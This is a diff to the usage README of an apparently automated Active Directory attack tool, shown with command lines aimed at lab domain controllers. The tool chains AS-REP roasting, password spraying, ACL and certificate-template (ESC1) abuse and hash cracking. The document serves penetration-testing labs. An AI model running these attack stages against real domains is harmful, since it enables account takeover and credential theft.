@@ -11,29 +11,31 @@ never auto-run (listeners hang).
 
 ```bash
 # discover domain / CIDR from the DC banner
-python3 /opt/gotad/ad-auto.py --i-am-authorized --dc 192.168.56.11 --profile goad
+python3 /opt/adtk/ad-auto.py --i-am-authorized --dc 192.168.56.11 --profile goad
 
 # HTB-style
-python3 /opt/gotad/ad-auto.py --i-am-authorized \
+python3 /opt/adtk/ad-auto.py --i-am-authorized \
   --dc 10.10.11.47 --iface tun0 --user j.smith --password 'Welcome1'
 
 # print the next action only
-python3 /opt/gotad/ad-auto.py --plan --resume
-python3 /opt/gotad/ad-auto.py --plan --dc 10.10.11.47 --domain megabank.htb
+python3 /opt/adtk/ad-auto.py --plan --resume
+python3 /opt/adtk/ad-auto.py --plan --dc 10.10.11.47 --domain megabank.htb
 
 # resume / jump
-python3 /opt/gotad/ad-auto.py --i-am-authorized --resume --from acl
-python3 /opt/gotad/ad-auto.py --i-am-authorized --dc $DC --only asrep,spray
+python3 /opt/adtk/ad-auto.py --i-am-authorized --resume --from acl
+python3 /opt/adtk/ad-auto.py --i-am-authorized --dc $DC --only asrep,spray
 
 # lab-only: act on first ForceChangePassword / ESC1
-python3 /opt/gotad/ad-auto.py --i-am-authorized --resume --abuse
+python3 /opt/adtk/ad-auto.py --i-am-authorized --resume --abuse
 ```
 
 `--domain` and `--cidr` are optional. Banner parse fills them
 (`(domain:foo.local)` → domain, `10.10.11.47` → `10.10.11.0/24`).
 `--profile auto` becomes `goad` if the domain looks like sevenkingdoms/essos.
 
-State: `/loot/auto/state.json` + `/loot/auto/report.txt` (`GOTAD_LOOT`).
+State: `logs/<dc-ip>/auto/state.json` + `report.txt` — one tree per target
+under `ADTK_LOGS` (default `/logs`). `--resume` without `--dc` picks the
+newest target tree.
 
 ## How it decides
 
@@ -77,7 +79,8 @@ Skips with a reason:
 - GPP / lsassy / secretsdump NTDS lines
 - `--trusts`
 
-Cracking: `--profile goad` uses `conf/wordlist-lab.txt` first, then rockyou.
+Cracking: `--profile goad` uses `conf/wordlist-lab.txt` (or the shipped
+`.example`) first, then rockyou.
 Usernames are taken from the hash itself (outfile-format 3), not “first name
 in the file”.
 
